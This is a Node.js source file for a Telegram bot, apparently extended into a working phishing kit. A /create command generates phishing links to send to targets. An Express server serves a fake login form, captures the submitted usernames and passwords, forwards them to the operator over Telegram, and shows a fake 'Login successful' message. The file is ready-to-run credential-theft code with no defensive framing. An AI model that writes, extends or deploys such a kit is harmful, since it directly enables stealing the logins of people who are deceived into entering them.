const { Telegraf } = require('telegraf');
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const app = express();
app.use(express.json());

const bot = new Telegraf(process.env.BOT_TOKEN);
const TARGET_USER_ID = '123456789'; // Replace with your Telegram user ID
const WEB_SERVER_URL = 'https://your-server.com'; // Replace with your domain

// Generate random phishing page IDs
function generatePageId() {
    return crypto.randomBytes(8).toString('hex');
}

// Handle /create command
bot.command('create', (ctx) => {
    const pageId = generatePageId();
    const phishingUrl = `${WEB_SERVER_URL}/login/${pageId}`;
    
    ctx.reply(`Phishing page created! Send this to your target:\n${phishingUrl}\n\nPage ID: ${pageId}`);
});

// Store captured credentials
const capturedData = {};

// Express routes for the phishing page
app.get('/login/:pageId', (req, res) => {
    const pageId = req.params.pageId;
    res.send(`
        <html>
        <head><title>Login Required</title></head>
        <body>
            <h2>Please login to continue</h2>
            <form action="/submit/${pageId}" method="POST">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    `);
});

app.post('/submit/:pageId', (req, res) => {
    const pageId = req.params.pageId;
    const { username, password } = req.body;
    
    // Store credentials
    capturedData[pageId] = { username, password };
    
    // Send to Telegram
    bot.telegram.sendMessage(
        TARGET_USER_ID,
        `🔥 New credentials captured!\nPage ID: ${pageId}\nUsername: ${username}\nPassword: ${password}`
    );
    
    // Redirect to real site or show fake success
    res.send('Login successful! Redirecting...');
});

// Original bot handlers remain
bot.start((ctx) => ctx.reply('Welcome to your Telegram bot!'));
bot.help((ctx) => ctx.reply('Send /create to generate a phishing page'));
bot.on('text', (ctx) => ctx.reply(`You said: ${ctx.message.text}`));

// Webhook handling
app.post('/api/bot', async (req, res) => {
    try {
        await bot.handleUpdate(req.body, res);
    } catch (error) {
        console.error('Error handling update:', error);
        res.status(500).send('Error processing update');
    }
});

app.get('/api/bot', (req, res) => {
    res.send('Bot is running');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
